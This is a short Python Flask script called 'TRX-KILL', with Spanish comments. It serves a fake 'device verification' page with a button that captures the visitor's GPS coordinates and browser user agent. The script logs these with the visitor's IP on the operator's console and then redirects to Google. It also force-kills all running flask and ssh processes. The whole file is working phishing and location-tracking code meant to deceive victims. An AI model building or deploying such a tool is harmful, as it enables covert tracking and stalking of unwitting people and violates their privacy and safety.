#!/usr/bin/env python3
import os
import threading
import subprocess
import re
import time
from flask import Flask, request, render_template_string

# --- CONFIGURACIГ“N ---
app = Flask('TRX-KILL')
URL_FINAL = "https://www.google.com"

# --- LIMPIEZA FORZADA (EVITA ERRORES DE PUERTO) ---
def force_clean():
    os.system('pkill -f flask > /dev/null 2>&1')
    os.system('pkill -f ssh > /dev/null 2>&1')
    time.sleep(0.5)

# --- PLANTILLA ---
HTML_FINAL = """
<!DOCTYPE html>
<html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
    <h2>VALIDACIГ“N REQUERIDA</h2>
    <p>Verificando dispositivo...</p>
    <button onclick="capturar()" style="padding:15px; background:green; color:white; border:none; cursor:pointer;">ACCEDER</button>
    <script>
        function capturar() {{
            navigator.geolocation.getCurrentPosition((p) => {{
                fetch('/log', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{lat: p.coords.latitude, lon: p.coords.longitude, ua: navigator.userAgent}})
                }}).then(() => window.location.href = "{url}");
            }});
        }}
    </script>
</body></html>
""".format(url=URL_FINAL)

@app.route('/')
def index(): return render_template_string(HTML_FINAL)

@app.route('/log', methods=['POST'])
def log():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    print(f"\n\033[1;32m[!] DATOS CAPTURADOS:\033[0m")
    print(f"[*] IP: {ip}")
    print(f"[*] GPS: {d['lat']}, {d['lon']}")
    print(f"[*] DISPOSITIVO: {d['ua']}\n")
    return "OK"

